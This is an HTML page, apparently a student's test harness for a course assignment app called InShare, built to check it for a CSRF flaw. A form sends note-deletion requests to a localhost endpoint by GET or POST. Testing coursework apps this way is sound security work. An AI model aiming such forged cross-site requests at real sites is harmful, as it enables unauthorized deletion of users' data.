<!DOCTYPE html>
<html lang="en">
  <head>
    <meta charset="UTF-8" />
    <meta name="viewport" content="width=device-width, initial-scale=1.0" />
    <link rel="stylesheet" href="styles.css" />
    <title>Document</title>
  </head>
  <body>
    <div class="container">
      <h1 class="header">Malicious website!!</h1>
      <p class="text">
        This is a site made for testing the presence of CSRF-vulnerability in
        InShare.
      </p>
      <p class="text">
        InShare is an application made for an obligatory assignment in the
        course INF226 at UiB.
      </p>

      <!-- Form to send request with a dropdown for method selection -->
      <form
        id="csrf-form"
        action="http://localhost:8080/note/delete/"
        method="GET"
        onsubmit="setFormMethod()"
      >
        <!-- Input for Note ID -->
        <input
          type="text"
          name="noteID"
          id="noteid"
          class="input"
          placeholder="Enter Note ID"
          required
        />

        <!-- Dropdown to select GET or POST method -->
        <select id="method-select" class="input">
          <option value="GET">GET</option>
          <option value="POST">POST</option>
        </select>

        <!-- Submit button to trigger the CSRF action -->
        <button type="submit" class="button-link">
          TEST CSRF-vulnerability by clicking this
        </button>
      </form>
    </div>

    <script>
      function setFormMethod() {
        // Get the selected method from the dropdown
        var selectedMethod = document.getElementById("method-select").value;
        // Set the form's method attribute based on the dropdown selection
        document.getElementById("csrf-form").method = selectedMethod;
      }
    </script>
  </body>
</html>
